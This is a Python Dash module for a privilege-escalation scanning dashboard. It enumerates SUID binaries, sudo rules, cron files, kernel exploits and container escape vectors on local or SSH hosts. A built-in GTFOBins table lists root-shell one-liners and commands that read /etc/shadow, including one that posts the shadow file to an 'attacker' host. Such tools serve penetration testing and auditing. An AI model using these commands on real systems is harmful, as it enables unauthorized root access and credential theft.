"""
ui_privesc.py
Privilege Escalation Dashboard — LinPEAS · GTFOBins · Kernel CVE · Sudo Abuse · MITRE ATT&CK
"""
from __future__ import annotations

import json
import os
import re
import subprocess
import threading
import time
from datetime import datetime
from typing import Any

import requests
from dash import callback, dcc, html, Input, Output, State, ctx
from dash.exceptions import PreventUpdate
import dash_bootstrap_components as dbc

# ── Styling ───────────────────────────────────────────────────────────────────
DARK_BG   = "#0d0d0d"
CARD_BG   = "#111317"
BORDER    = "1px solid #1e2230"
INPUT_STY = {"background": "#1a1d24", "border": BORDER, "color": "#e0e0e0",
             "borderRadius": "6px", "fontSize": "13px"}
BTN_SM    = {"borderRadius": "6px", "fontSize": "12px", "padding": "4px 10px"}
LABEL     = {"color": "#8e9eb0", "fontSize": "11px", "marginBottom": "4px",
             "fontWeight": "600", "textTransform": "uppercase", "letterSpacing": "0.5px"}

_LOCK = threading.Lock()
_PRIVESC_STATE: dict = {
    "running": False, "done": False,
    "steps": [], "results": {},
}

def _log(icon: str, text: str, ok: bool = True):
    ts = datetime.now().strftime("%H:%M:%S")
    with _LOCK:
        _PRIVESC_STATE["steps"].append({"ts": ts, "icon": icon, "text": text, "ok": ok})


# ── MITRE ATT&CK PrivEsc Techniques ──────────────────────────────────────────
MITRE_PRIVESC = [
    {"tid": "T1548", "name": "Abuse Elevation Control", "desc": "Bypass UAC, sudo abuse, setuid/setgid"},
    {"tid": "T1068", "name": "Exploitation for Privilege Escalation", "desc": "Kernel exploits, driver vulns"},
    {"tid": "T1134", "name": "Access Token Manipulation", "desc": "Token impersonation, theft"},
    {"tid": "T1574", "name": "Hijack Execution Flow", "desc": "DLL hijacking, PATH abuse, LD_PRELOAD"},
    {"tid": "T1055", "name": "Process Injection", "desc": "Shellcode injection, hollow process"},
    {"tid": "T1053", "name": "Scheduled Task/Job", "desc": "Cron abuse, at jobs, systemd timers"},
    {"tid": "T1078", "name": "Valid Accounts", "desc": "Reuse discovered creds for higher access"},
    {"tid": "T1611", "name": "Escape to Host", "desc": "Container breakout, Docker escape"},
]

# ── GTFOBins known SUID escalation binaries ──────────────────────────────────
GTFOBINS_SUID = {
    "bash": "bash -p",
    "chmod": "chmod u+s /bin/bash",
    "cp": "cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash",
    "curl": "curl file:///etc/shadow",
    "dash": "dash -p",
    "docker": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
    "env": "env /bin/bash -p",
    "find": "find / -exec /bin/bash -p \\;",
    "ftp": "ftp → !/bin/bash",
    "gdb": "gdb -nx -ex 'python import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
    "less": "less /etc/shadow → !sh",
    "man": "man man → !sh",
    "more": "more /etc/shadow → !sh",
    "nano": "nano → ^R^X → reset; sh 1>&0 2>&0",
    "nmap": "nmap --interactive → !sh   (old versions)",
    "perl": "perl -e 'exec \"/bin/bash\";'",
    "php": "php -r 'pcntl_exec(\"/bin/bash\", [\"-p\"]);'",
    "python": "python -c 'import os; os.execl(\"/bin/bash\", \"bash\", \"-p\")'",
    "python3": "python3 -c 'import os; os.execl(\"/bin/bash\", \"bash\", \"-p\")'",
    "ruby": "ruby -e 'exec \"/bin/bash -p\"'",
    "strace": "strace -o /dev/null /bin/bash -p",
    "tail": "tail -f /etc/shadow",
    "tar": "tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash",
    "tee": "echo data | tee /etc/passwd",
    "vim": "vim -c ':!/bin/bash'",
    "vi": "vi → :!bash",
    "wget": "wget --post-file=/etc/shadow http://attacker/",
    "zip": "zip /tmp/x.zip /etc/passwd -T -TT 'sh #'",
}

# ── Scanners ──────────────────────────────────────────────────────────────────

def _scan_suid(host: str) -> list[dict]:
    """Find SUID binaries on target (local or SSH)."""
    _log("🔍", f"Scanning SUID binaries on {host}…")
    results = []
    try:
        if host in ("localhost", "127.0.0.1", ""):
            cmd = "find / -perm -4000 -type f 2>/dev/null"
        else:
            cmd = f"ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no {host} 'find / -perm -4000 -type f 2>/dev/null'"
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        binaries = [b.strip() for b in r.stdout.strip().split("\n") if b.strip()]
        for b in binaries:
            name = os.path.basename(b)
            exploit = GTFOBINS_SUID.get(name)
            results.append({
                "path": b, "name": name,
                "exploitable": exploit is not None,
                "exploit": exploit or "No known GTFOBins exploit",
                "risk": "🔴 HIGH" if exploit else "🟢 Safe",
            })
        _log("🔍", f"SUID scan: {len(binaries)} binaries, {len([r for r in results if r['exploitable']])} exploitable", ok=True)
    except Exception as e:
        _log("🔍", f"SUID scan failed: {e}", ok=False)
    return results


def _scan_sudo(host: str) -> list[dict]:
    """Check sudo privileges."""
    _log("🔑", f"Checking sudo configuration on {host}…")
    results = []
    try:
        if host in ("localhost", "127.0.0.1", ""):
            cmd = "sudo -l 2>/dev/null || echo 'sudo not available'"
        else:
            cmd = f"ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no {host} 'sudo -l 2>/dev/null'"
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
        output = r.stdout.strip()
        lines = output.split("\n")
        for line in lines:
            line = line.strip()
            if not line or line.startswith("Matching") or line.startswith("User"):
                continue
            is_nopasswd = "NOPASSWD" in line
            binary = line.split()[-1] if line.split() else ""
            bname = os.path.basename(binary)
            gtfo = GTFOBINS_SUID.get(bname)
            results.append({
                "rule": line,
                "nopasswd": is_nopasswd,
                "binary": binary,
                "gtfobins": gtfo is not None,
                "exploit": gtfo or "—",
                "risk": "🔴 CRITICAL" if (is_nopasswd and gtfo) else "🟡 MEDIUM" if is_nopasswd else "🟢 Low",
            })
        _log("🔑", f"Sudo check: {len(results)} rules found", ok=True)
    except Exception as e:
        _log("🔑", f"Sudo check failed: {e}", ok=False)
    return results


def _scan_writable_crons(host: str) -> list[dict]:
    """Find writable cron files/dirs."""
    _log("⏰", f"Auditing cron jobs on {host}…")
    results = []
    try:
        paths = ["/etc/crontab", "/etc/cron.d", "/var/spool/cron", "/etc/cron.daily",
                 "/etc/cron.hourly", "/etc/cron.weekly", "/etc/cron.monthly"]
        for p in paths:
            if host in ("localhost", "127.0.0.1", ""):
                cmd = f"ls -la {p} 2>/dev/null && cat {p} 2>/dev/null | head -20"
            else:
                cmd = f"ssh -o ConnectTimeout=5 {host} 'ls -la {p} 2>/dev/null && cat {p} 2>/dev/null | head -20'"
            r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
            if r.stdout.strip():
                writable = "w" in r.stdout[:20] if r.stdout else False
                results.append({
                    "path": p,
                    "writable": writable,
                    "content": r.stdout.strip()[:200],
                    "risk": "🔴 HIGH" if writable else "🟢 Safe",
                })
        _log("⏰", f"Cron audit: {len(results)} entries checked", ok=True)
    except Exception as e:
        _log("⏰", f"Cron audit failed: {e}", ok=False)
    return results


def _scan_kernel(host: str) -> list[dict]:
    """Get kernel version and match against known exploits."""
    _log("🐧", f"Checking kernel version on {host}…")
    results = []
    try:
        if host in ("localhost", "127.0.0.1", ""):
            cmd = "uname -r 2>/dev/null"
        else:
            cmd = f"ssh -o ConnectTimeout=5 {host} 'uname -r 2>/dev/null'"
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
        kernel = r.stdout.strip()
        if kernel:
            _log("🐧", f"Kernel: {kernel}")
            # Try searchsploit
            try:
                ss = subprocess.run(
                    f"searchsploit --nocolour 'linux kernel {kernel[:4]}' 2>/dev/null | head -15",
                    shell=True, capture_output=True, text=True, timeout=15
                )
                for line in ss.stdout.strip().split("\n"):
                    if "|" in line and "Exploit" not in line and "---" not in line:
                        parts = [p.strip() for p in line.split("|")]
                        if len(parts) >= 2:
                            results.append({
                                "title": parts[0][:80],
                                "path": parts[1] if len(parts) > 1 else "",
                                "kernel": kernel,
                            })
            except Exception:
                pass
            if not results:
                results.append({"title": f"Kernel {kernel} — no public exploits found via searchsploit",
                                "path": "", "kernel": kernel})
            _log("🐧", f"Kernel exploits: {len(results)} matches", ok=True)
    except Exception as e:
        _log("🐧", f"Kernel check failed: {e}", ok=False)
    return results


def _scan_docker_escape(host: str) -> list[dict]:
    """Check for container escape vectors."""
    _log("🐳", f"Checking container escape vectors on {host}…")
    results = []
    try:
        checks = [
            ("Docker socket mounted", "ls -la /var/run/docker.sock 2>/dev/null"),
            ("Running as root in container", "whoami 2>/dev/null && cat /proc/1/cgroup 2>/dev/null | grep docker | head -1"),
            ("Privileged container", "cat /proc/self/status 2>/dev/null | grep -i cap"),
            ("Host PID namespace", "ls /proc/1/root/etc/hostname 2>/dev/null"),
        ]
        for name, cmd in checks:
            if host not in ("localhost", "127.0.0.1", ""):
                cmd = f"ssh -o ConnectTimeout=5 {host} '{cmd}'"
            r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
            found = bool(r.stdout.strip())
            results.append({
                "check": name,
                "found": found,
                "output": r.stdout.strip()[:100],
                "risk": "🔴 HIGH" if found else "🟢 Safe",
            })
        _log("🐳", f"Container escape: {len([r for r in results if r['found']])} vectors found", ok=True)
    except Exception as e:
        _log("🐳", f"Container check failed: {e}", ok=False)
    return results


# ── UI helpers ────────────────────────────────────────────────────────────────
def _card(*children, style=None):
    base = {"background": CARD_BG, "border": BORDER, "borderRadius": "10px",
            "padding": "16px", "marginBottom": "12px"}
    if style:
        base.update(style)
    return html.Div(children, style=base)


def _badge(text, color="#3498db"):
    return html.Span(text, style={"background": color, "color": "#fff",
                                   "borderRadius": "4px", "padding": "2px 8px",
                                   "fontSize": "10px", "fontWeight": "700",
                                   "marginRight": "6px"})


# ── Main Layout ───────────────────────────────────────────────────────────────
def layout() -> html.Div:
    return html.Div([
        dcc.Store(id="privesc-results", data={}),
        dcc.Store(id="privesc-scan-state", data="idle"),
        dcc.Interval(id="privesc-scan-poll", interval=2000, disabled=True, max_intervals=120),

        # CSS animations loaded via assets/module_animations.css

        # Header
        html.Div([
            html.Div([
                html.H4("🔑 Privilege Escalation",
                        style={"color": "#e0e0e0", "fontWeight": "700", "margin": "0"}),
                html.Div("SUID · Sudo · Kernel CVE · Cron · Docker Escape · GTFOBins · MITRE ATT&CK T1548",
                         style={"color": "#636e72", "fontSize": "13px"}),
            ], style={"flex": "1"}),
            # Traffic light
            html.Div([
                html.Div(id="privesc-tl", style={
                    "width": "16px", "height": "16px", "borderRadius": "50%",
                    "background": "#333", "display": "inline-block",
                    "marginRight": "8px", "verticalAlign": "middle",
                }),
                html.Span(id="privesc-tl-label", children="Idle",
                          style={"color": "#636e72", "fontSize": "12px",
                                 "verticalAlign": "middle"}),
            ]),
        ], style={"display": "flex", "alignItems": "center", "marginBottom": "16px"}),

        # Stats bar
        html.Div(id="privesc-stats-bar", style={"marginBottom": "12px"}),

        dbc.Row([
            # ── Left: Target + Scan Config ──────────────────────────────────
            dbc.Col([
                _card(
                    html.Div("🎯 Target Configuration",
                             style={"color": "#e0e0e0", "fontWeight": "600",
                                    "marginBottom": "12px"}),
                    html.Div("HOST / IP", style=LABEL),
                    dbc.Input(id="privesc-host", placeholder="e.g. 192.168.1.50 or localhost",
                              value="localhost",
                              style={**INPUT_STY, "marginBottom": "8px"}),
                    html.Div("OS TYPE", style=LABEL),
                    dbc.Select(id="privesc-os", options=[
                        {"label": "🐧 Linux", "value": "linux"},
                        {"label": "🪟 Windows", "value": "windows"},
                        {"label": "🍎 macOS", "value": "macos"},
                        {"label": "🐳 Container", "value": "container"},
                    ], value="linux", style={**INPUT_STY, "marginBottom": "8px"}),
                    html.Div("SCAN MODULES", style=LABEL),
                    dbc.Checklist(id="privesc-modules", options=[
                        {"label": "🔍 SUID Binaries", "value": "suid"},
                        {"label": "🔑 Sudo Misconfigs", "value": "sudo"},
                        {"label": "⏰ Writable Crons", "value": "cron"},
                        {"label": "🐧 Kernel Exploits", "value": "kernel"},
                        {"label": "🐳 Container Escape", "value": "docker"},
                    ], value=["suid", "sudo", "cron", "kernel", "docker"],
                        style={"color": "#b0b0b0", "fontSize": "12px", "marginBottom": "10px"},
                        inputStyle={"marginRight": "4px"}),
                    dbc.Button("🔑 Scan for PrivEsc", id="privesc-run-btn",
                               color="warning", size="sm",
                               style={**BTN_SM, "width": "100%", "padding": "10px",
                                      "fontSize": "14px", "marginBottom": "8px"}),
                    html.Div(id="privesc-status",
                             style={"color": "#636e72", "fontSize": "12px", "minHeight": "18px"}),
                    # Activity feed
                    html.Div([
                        html.Div("LIVE ACTIVITY", style={
                            "color": "#4a5568", "fontSize": "9px", "fontWeight": "700",
                            "letterSpacing": "1px", "textTransform": "uppercase",
                            "marginBottom": "6px", "paddingTop": "8px",
                            "borderTop": "1px solid #1e2230"}),
                        html.Div(id="privesc-activity",
                                 children=[html.Div("— No scan running",
                                                    style={"color": "#3a3f4b", "fontSize": "11px",
                                                           "fontStyle": "italic"})],
                                 style={"maxHeight": "200px", "overflowY": "auto",
                                        "fontFamily": "monospace"}),
                    ]),
                ),
            ], width=3),

            # ── Centre: Results ─────────────────────────────────────────────
            dbc.Col([
                dbc.Tabs(id="privesc-tabs", active_tab="tab-suid",
                         style={"marginBottom": "12px"}, children=[
                    dbc.Tab(label="🔍 SUID Binaries", tab_id="tab-suid"),
                    dbc.Tab(label="🔑 Sudo Rules",    tab_id="tab-sudo"),
                    dbc.Tab(label="⏰ Cron Jobs",      tab_id="tab-cron"),
                    dbc.Tab(label="🐧 Kernel CVEs",   tab_id="tab-kernel"),
                    dbc.Tab(label="🐳 Container",     tab_id="tab-docker"),
                ]),
                html.Div(id="privesc-main-content"),
            ], width=6),

            # ── Right: MITRE + GTFOBins ─────────────────────────────────────
            dbc.Col([
                _card(
                    html.Div("⚔️ MITRE ATT&CK — TA0004",
                             style={"color": "#e0e0e0", "fontWeight": "600",
                                    "marginBottom": "10px"}),
                    *[html.Div([
                        html.Div([
                            _badge(t["tid"], "#e74c3c"),
                            html.Span(t["name"], style={"color": "#e0e0e0", "fontSize": "12px",
                                                         "fontWeight": "600"}),
                        ]),
                        html.Div(t["desc"], style={"color": "#636e72", "fontSize": "10px",
                                                    "marginLeft": "60px", "marginBottom": "8px"}),
                    ]) for t in MITRE_PRIVESC],
                ),
                _card(
                    html.Div("📖 GTFOBins Quick Ref",
                             style={"color": "#e0e0e0", "fontWeight": "600",
                                    "marginBottom": "10px"}),
                    html.Div(id="privesc-gtfo-panel",
                             children=[html.Div(
                                 f"{name} → {cmd[:50]}",
                                 style={"color": "#50fa7b", "fontSize": "10px",
                                        "fontFamily": "monospace", "marginBottom": "3px",
                                        "borderBottom": f"1px solid {DARK_BG}",
                                        "paddingBottom": "3px"})
                                 for name, cmd in list(GTFOBINS_SUID.items())[:12]],
                             style={"maxHeight": "220px", "overflowY": "auto"}),
                ),
            ], width=3),
        ]),
    ], style={"background": DARK_BG, "minHeight": "100vh", "padding": "24px"})


# ── Run PrivEsc Scan ──────────────────────────────────────────────────────────

@callback(
    Output("privesc-results",    "data",     allow_duplicate=True),
    Output("privesc-status",     "children", allow_duplicate=True),
    Output("privesc-stats-bar",  "children", allow_duplicate=True),
    Output("privesc-tl",         "style",    allow_duplicate=True),
    Output("privesc-tl-label",   "children", allow_duplicate=True),
    Output("privesc-scan-poll",       "disabled", allow_duplicate=True),
    Input("privesc-run-btn",     "n_clicks"),
    State("privesc-host",        "value"),
    State("privesc-os",          "value"),
    State("privesc-modules",     "value"),
    prevent_initial_call=True,
)
def run_privesc(n, host, os_type, modules):
    if not n:
        raise PreventUpdate

    host = (host or "localhost").strip()
    modules = modules or ["suid", "sudo", "cron", "kernel"]

    with _LOCK:
        _PRIVESC_STATE.update({"running": True, "done": False, "steps": [], "results": {}})

    def _do_scan():
        results = {"suid": [], "sudo": [], "cron": [], "kernel": [], "docker": []}
        try:
            if "suid" in modules:
                results["suid"] = _scan_suid(host)
            if "sudo" in modules:
                results["sudo"] = _scan_sudo(host)
            if "cron" in modules:
                results["cron"] = _scan_writable_crons(host)
            if "kernel" in modules:
                results["kernel"] = _scan_kernel(host)
            if "docker" in modules:
                results["docker"] = _scan_docker_escape(host)
            _log("✅", f"PrivEsc scan complete for {host}")
        except Exception as e:
            _log("❌", f"Scan error: {e}", ok=False)
        finally:
            with _LOCK:
                _PRIVESC_STATE["running"] = False
                _PRIVESC_STATE["done"] = True
                _PRIVESC_STATE["results"] = results

    threading.Thread(target=_do_scan, daemon=True).start()

    return (
        {},
        f"🔄 Scanning {host}…",
        html.Div(),
        {"width": "16px", "height": "16px", "borderRadius": "50%",
         "background": "#f39c12", "display": "inline-block",
         "marginRight": "8px", "verticalAlign": "middle",
         "animation": "privesc-blink 0.8s ease-in-out infinite"},
        "🟡 Scanning…",
        False,
    )


# ── Poll scan progress ────────────────────────────────────────────────────────

def _build_feed(steps):
    if not steps:
        return [html.Div("⏳ Initialising…", style={"color": "#8e9eb0", "fontSize": "11px"})]
    rows = []
    for s in steps:
        color = "#00c88c" if s.get("ok") else "#e74c3c"
        rows.append(html.Div([
            html.Span(s["ts"], style={"color": "#4a5568", "fontSize": "9px",
                                       "marginRight": "6px", "fontFamily": "monospace"}),
            html.Span(s["icon"] + " ", style={"fontSize": "11px", "marginRight": "3px"}),
            html.Span(s["text"], style={"color": color, "fontSize": "11px"}),
        ], style={"padding": "2px 0", "borderBottom": "1px solid #111317"}))
    return rows


@callback(
    Output("privesc-results",    "data",     allow_duplicate=True),
    Output("privesc-status",     "children", allow_duplicate=True),
    Output("privesc-stats-bar",  "children", allow_duplicate=True),
    Output("privesc-tl",         "style",    allow_duplicate=True),
    Output("privesc-tl-label",   "children", allow_duplicate=True),
    Output("privesc-activity",   "children"),
    Output("privesc-scan-poll",       "disabled", allow_duplicate=True),
    Input("privesc-scan-poll",        "n_intervals"),
    prevent_initial_call=True,
)
def poll_privesc(n):
    with _LOCK:
        done    = _PRIVESC_STATE["done"]
        steps   = list(_PRIVESC_STATE["steps"])
        results = dict(_PRIVESC_STATE.get("results", {}))

    feed = _build_feed(steps)

    if not done:
        last = steps[-1]["text"] if steps else "Starting…"
        return (
            {}, f"🔄 {last}", html.Div(),
            {"width": "16px", "height": "16px", "borderRadius": "50%",
             "background": "#f39c12", "display": "inline-block",
             "marginRight": "8px", "verticalAlign": "middle",
             "animation": "privesc-blink 0.8s ease-in-out infinite"},
            "🟡 Running", feed, False,
        )

    # Done
    n_suid = len([r for r in results.get("suid", []) if r.get("exploitable")])
    n_sudo = len([r for r in results.get("sudo", []) if r.get("gtfobins")])
    n_kern = len(results.get("kernel", []))
    n_dock = len([r for r in results.get("docker", []) if r.get("found")])
    n_cron = len([r for r in results.get("cron", []) if r.get("writable")])

    total_vulns = n_suid + n_sudo + n_dock + n_cron

    stats = html.Div([
        html.Span([html.Span(str(n_suid), style={"fontWeight": "700", "color": "#e74c3c"}),
                   html.Span(" SUID exploitable", style={"color": "#8e9eb0", "fontSize": "11px"})],
                  style={"background": CARD_BG, "border": BORDER, "borderRadius": "20px",
                         "padding": "4px 12px", "marginRight": "8px", "display": "inline-block"}),
        html.Span([html.Span(str(n_sudo), style={"fontWeight": "700", "color": "#f39c12"}),
                   html.Span(" Sudo abusable", style={"color": "#8e9eb0", "fontSize": "11px"})],
                  style={"background": CARD_BG, "border": BORDER, "borderRadius": "20px",
                         "padding": "4px 12px", "marginRight": "8px", "display": "inline-block"}),
        html.Span([html.Span(str(n_kern), style={"fontWeight": "700", "color": "#9b59b6"}),
                   html.Span(" Kernel CVEs", style={"color": "#8e9eb0", "fontSize": "11px"})],
                  style={"background": CARD_BG, "border": BORDER, "borderRadius": "20px",
                         "padding": "4px 12px", "marginRight": "8px", "display": "inline-block"}),
        html.Span([html.Span(str(n_dock), style={"fontWeight": "700", "color": "#1abc9c"}),
                   html.Span(" Escape vectors", style={"color": "#8e9eb0", "fontSize": "11px"})],
                  style={"background": CARD_BG, "border": BORDER, "borderRadius": "20px",
                         "padding": "4px 12px", "display": "inline-block"}),
    ])

    return (
        results, f"✅ PrivEsc scan complete — {total_vulns} escalation vectors found", stats,
        {"width": "16px", "height": "16px", "borderRadius": "50%",
         "background": "#00e676", "display": "inline-block",
         "marginRight": "8px", "verticalAlign": "middle",
         "animation": "privesc-glow 2s ease-in-out infinite"},
        "🟢 Complete", feed, True,
    )


# ── Tab content renderer ──────────────────────────────────────────────────────

@callback(
    Output("privesc-main-content", "children"),
    Input("privesc-tabs",    "active_tab"),
    Input("privesc-results", "data"),
)
def render_privesc_tab(tab, results):
    results = results or {}

    if tab == "tab-suid":
        items = results.get("suid", [])
        if not items:
            return _card(html.Div("Run scan to check SUID binaries.",
                                  style={"color": "#636e72", "textAlign": "center", "padding": "30px"}))
        rows = []
        for i in sorted(items, key=lambda x: x.get("exploitable", False), reverse=True):
            color = "#e74c3c" if i.get("exploitable") else "#636e72"
            rows.append(html.Div([
                html.Div([
                    html.Span(i.get("risk", ""), style={"marginRight": "8px"}),
                    html.Span(i.get("path", ""), style={"color": "#e0e0e0", "fontSize": "12px",
                                                         "fontFamily": "monospace"}),
                ]),
                html.Div(i.get("exploit", ""), style={"color": "#50fa7b" if i.get("exploitable") else "#444",
                                                       "fontSize": "11px", "marginLeft": "30px",
                                                       "fontFamily": "monospace"}),
            ], style={"padding": "6px 8px", "borderBottom": f"1px solid {DARK_BG}"}))
        return _card(
            html.Div(f"🔍 SUID Binaries — {len(items)} found, {len([i for i in items if i.get('exploitable')])} exploitable",
                     style={"color": "#e0e0e0", "fontWeight": "600", "marginBottom": "10px"}),
            html.Div(rows, style={"maxHeight": "450px", "overflowY": "auto"}))

    elif tab == "tab-sudo":
        items = results.get("sudo", [])
        if not items:
            return _card(html.Div("Run scan to check sudo rules.",
                                  style={"color": "#636e72", "textAlign": "center", "padding": "30px"}))
        rows = []
        for i in sorted(items, key=lambda x: x.get("gtfobins", False), reverse=True):
            rows.append(html.Div([
                html.Div([
                    html.Span(i.get("risk", ""), style={"marginRight": "8px"}),
                    html.Span(i.get("rule", ""), style={"color": "#e0e0e0", "fontSize": "12px",
                                                         "fontFamily": "monospace"}),
                    _badge("NOPASSWD", "#e74c3c") if i.get("nopasswd") else html.Span(),
                    _badge("GTFOBins", "#f39c12") if i.get("gtfobins") else html.Span(),
                ]),
                html.Div(i.get("exploit", ""), style={"color": "#50fa7b" if i.get("gtfobins") else "#444",
                                                       "fontSize": "11px", "marginLeft": "30px",
                                                       "fontFamily": "monospace"}) if i.get("gtfobins") else html.Span(),
            ], style={"padding": "6px 8px", "borderBottom": f"1px solid {DARK_BG}"}))
        return _card(
            html.Div(f"🔑 Sudo Rules — {len(items)} rules",
                     style={"color": "#e0e0e0", "fontWeight": "600", "marginBottom": "10px"}),
            html.Div(rows, style={"maxHeight": "450px", "overflowY": "auto"}))

    elif tab == "tab-cron":
        items = results.get("cron", [])
        if not items:
            return _card(html.Div("Run scan to audit cron jobs.",
                                  style={"color": "#636e72", "textAlign": "center", "padding": "30px"}))
        rows = []
        for i in items:
            rows.append(html.Div([
                html.Div([
                    html.Span(i.get("risk", ""), style={"marginRight": "8px"}),
                    html.Span(i.get("path", ""), style={"color": "#e0e0e0", "fontSize": "12px",
                                                         "fontFamily": "monospace"}),
                    _badge("WRITABLE", "#e74c3c") if i.get("writable") else html.Span(),
                ]),
                html.Pre(i.get("content", "")[:150],
                         style={"color": "#636e72", "fontSize": "10px", "margin": "4px 0 0 30px",
                                "maxHeight": "60px", "overflow": "hidden"}),
            ], style={"padding": "6px 8px", "borderBottom": f"1px solid {DARK_BG}"}))
        return _card(
            html.Div(f"⏰ Cron Jobs — {len(items)} entries",
                     style={"color": "#e0e0e0", "fontWeight": "600", "marginBottom": "10px"}),
            html.Div(rows, style={"maxHeight": "450px", "overflowY": "auto"}))

    elif tab == "tab-kernel":
        items = results.get("kernel", [])
        if not items:
            return _card(html.Div("Run scan to check kernel exploits.",
                                  style={"color": "#636e72", "textAlign": "center", "padding": "30px"}))
        rows = []
        for i in items:
            rows.append(html.Div([
                html.Span("🐧 ", style={"marginRight": "4px"}),
                html.Span(i.get("title", ""), style={"color": "#e0e0e0", "fontSize": "12px"}),
                html.Span(f"  [{i.get('path', '')}]",
                          style={"color": "#636e72", "fontSize": "10px"}) if i.get("path") else html.Span(),
            ], style={"padding": "6px 8px", "borderBottom": f"1px solid {DARK_BG}"}))
        return _card(
            html.Div(f"🐧 Kernel Exploits — {len(items)} matches",
                     style={"color": "#e0e0e0", "fontWeight": "600", "marginBottom": "10px"}),
            html.Div(rows, style={"maxHeight": "450px", "overflowY": "auto"}))

    elif tab == "tab-docker":
        items = results.get("docker", [])
        if not items:
            return _card(html.Div("Run scan to check container escape vectors.",
                                  style={"color": "#636e72", "textAlign": "center", "padding": "30px"}))
        rows = []
        for i in items:
            rows.append(html.Div([
                html.Span(i.get("risk", ""), style={"marginRight": "8px"}),
                html.Span(i.get("check", ""), style={"color": "#e0e0e0", "fontSize": "12px"}),
                html.Div(i.get("output", ""), style={"color": "#50fa7b", "fontSize": "10px",
                                                      "fontFamily": "monospace", "marginLeft": "30px"})
                if i.get("output") else html.Span(),
            ], style={"padding": "6px 8px", "borderBottom": f"1px solid {DARK_BG}"}))
        return _card(
            html.Div(f"🐳 Container Escape — {len(items)} checks",
                     style={"color": "#e0e0e0", "fontWeight": "600", "marginBottom": "10px"}),
            html.Div(rows, style={"maxHeight": "450px", "overflowY": "auto"}))

    return _card(html.Div("Select a tab.", style={"color": "#636e72"}))
